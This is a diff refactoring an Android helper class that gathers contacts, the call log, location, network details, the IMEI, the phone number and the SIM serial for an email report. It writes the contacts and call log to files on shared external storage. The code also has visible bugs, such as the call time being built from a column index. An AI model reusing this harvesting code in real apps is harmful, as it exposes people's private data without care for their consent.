@@ -41,25 +41,24 @@ class EmailAttachmentHelper {
 
     private File getContacts() {
         Cursor phones = c.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
-        String contacts = null;
+        StringBuilder contacts = new StringBuilder();
         if (phones != null) {
             while (phones.moveToNext()) {
-                contacts += phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
-                        + " , " + phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)) + "\n";
+                contacts.append(phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" , ").append(phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
             }
             phones.close();
         }
         File contactsFile = null;
-        if (contacts != null) {
-            try {
-                contactsFile = new File(Environment.getExternalStorageDirectory(), "contacts.txt");
-                FileOutputStream fileInput = new FileOutputStream(contactsFile);
-                OutputStreamWriter writer = new OutputStreamWriter(fileInput);
-                writer.write(contacts);
-                writer.close();
-                fileInput.close();
-            } catch (Exception ignored) {}
-        }
+
+        try {
+            contactsFile = new File(Environment.getExternalStorageDirectory(), "contacts.txt");
+            FileOutputStream fileInput = new FileOutputStream(contactsFile);
+            OutputStreamWriter writer = new OutputStreamWriter(fileInput);
+            writer.write(contacts.toString());
+            writer.close();
+            fileInput.close();
+        } catch (Exception ignored) {}
+
         return contactsFile; //check if file is null when attaching
     }
 
@@ -68,7 +67,7 @@ class EmailAttachmentHelper {
         if (ActivityCompat.checkSelfPermission(c, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
             Cursor calllog = c.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
 
-            String content = null;
+            StringBuilder content = new StringBuilder();
 
             if (calllog != null) {
                 while (calllog.moveToNext()) {
@@ -91,27 +90,26 @@ class EmailAttachmentHelper {
                             break;
                     }
 
-                    content += "Number: " + calllog.getString(calllog.getColumnIndex(CallLog.Calls.NUMBER))
-                            + "\nCall Date: " + calllog.getString(calllog.getColumnIndex(CallLog.Calls.DATE))
-                            + "\nCall Time: " + new Date((long) calllog.getColumnIndex(CallLog.Calls.DATE))
-                            + "\nCall Duration: " + calllog.getString(calllog.getColumnIndex(CallLog.Calls.DURATION))
-                            + "\nCall Type: " + type + "\n";
+                    content.append("Number: ").append(calllog.getString(calllog.getColumnIndex(CallLog.Calls.NUMBER)))
+                            .append("\nCall Date: ").append(calllog.getString(calllog.getColumnIndex(CallLog.Calls.DATE)))
+                            .append("\nCall Time: ").append(new Date((long) calllog.getColumnIndex(CallLog.Calls.DATE)))
+                            .append("\nCall Duration: ").append(calllog.getString(calllog.getColumnIndex(CallLog.Calls.DURATION)))
+                            .append("\nCall Type: ").append(type).append("\n");
                 }
             }
             if (calllog != null) {
                 calllog.close();
             }
 
-            if(content!=null){
-                try {
-                    callLogFile = new File(Environment.getExternalStorageDirectory(), "calllog.txt");
-                    FileOutputStream fileInput = new FileOutputStream(callLogFile);
-                    OutputStreamWriter writer = new OutputStreamWriter(fileInput);
-                    writer.write(content);
-                    writer.close();
-                    fileInput.close();
-                } catch (Exception ignored) {}
-            }
+            try {
+                callLogFile = new File(Environment.getExternalStorageDirectory(), "calllog.txt");
+                FileOutputStream fileInput = new FileOutputStream(callLogFile);
+                OutputStreamWriter writer = new OutputStreamWriter(fileInput);
+                writer.write(content.toString());
+                writer.close();
+                fileInput.close();
+            } catch (Exception ignored) {}
+
         }
         return callLogFile;
     }
@@ -137,12 +135,13 @@ class EmailAttachmentHelper {
         }
     }
     @SuppressWarnings("deprecation")
-    @SuppressLint("HardwareIds")
+    @SuppressLint({"HardwareIds", "MissingPermission"})
     String getEmailString(){
         String emailBody = "";
         try {
             final WifiManager wifiManager = (WifiManager) c.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
-            NetworkInfo networkInfo = ((ConnectivityManager) c.getSystemService(Context.CONNECTIVITY_SERVICE)).getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
+            NetworkInfo networkInfo = ((ConnectivityManager) c.getSystemService(Context.CONNECTIVITY_SERVICE))
+                    .getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
             TelephonyManager telephonyManager = (TelephonyManager)c.getSystemService(Context.TELEPHONY_SERVICE);
             Location loc = new LocationService(c).getLoc();
 
@@ -152,21 +151,25 @@ class EmailAttachmentHelper {
                     + "," + loc.getLongitude()
                     + "\nTime Declared: " + DateFormat.getDateTimeInstance().format(new Date())
                     + "\nDeclared by: " + loc.getProvider() + "\nAccuracy: " + loc.getAccuracy()
-                    + "\nWiFi enabled? " + wifiManager.isWifiEnabled() + "\nSSID: " + wifiManager.getConnectionInfo().getSSID()
-                    + "\nIP: " + wifiManager.getConnectionInfo().getIpAddress()
+                    + "\nWiFi enabled? " + (wifiManager != null && wifiManager.isWifiEnabled()) + "\nSSID: " + (wifiManager != null ? wifiManager.getConnectionInfo().getSSID() : "null")
+                    + "\nIP: " + (wifiManager != null ? wifiManager.getConnectionInfo().getIpAddress() : 0)
                     + "\nMobile network enabled? " + networkInfo.isConnected()
                     + "\nNetwork type: " + networkInfo.getType() + " Network name: " + networkInfo.getTypeName()
                     + "\nExtra info: " + networkInfo.getExtraInfo()
                     + "\nBattery: " + getBattery(c)
-                    + "\nIMEI: " +  telephonyManager.getDeviceId()
-                    + "\nPhone number: " + telephonyManager.getLine1Number()
-                    + "\nSIM Serial: " + telephonyManager.getSimSerialNumber();
+                    + "\nIMEI: " + (telephonyManager != null ? telephonyManager.getDeviceId() : "null")
+                    + "\nPhone number: " + (telephonyManager != null ? telephonyManager.getLine1Number() : "null")
+                    + "\nSIM Serial: " + (telephonyManager != null ? telephonyManager.getSimSerialNumber() : "null");
         }catch(Exception ignored){}
         return emailBody;
     }
     private String getBattery(Context c){
-        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP ?
-                String.valueOf(((BatteryManager) c.getSystemService(Context.BATTERY_SERVICE)).getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)) :
-                "Build number low";
+        if ((c.getSystemService(Context.BATTERY_SERVICE)) != null) {
+                return Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP ?
+                        String.valueOf((c.getSystemService(Context.BATTERY_SERVICE)) != null ? (c.getSystemService(Context.BATTERY_SERVICE)) != null ? ((BatteryManager) c.getSystemService(Context.BATTERY_SERVICE))
+                                .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) : 0 : 0) : "Build number low";
+        } else {
+            return "0";
+        }
     }
 }
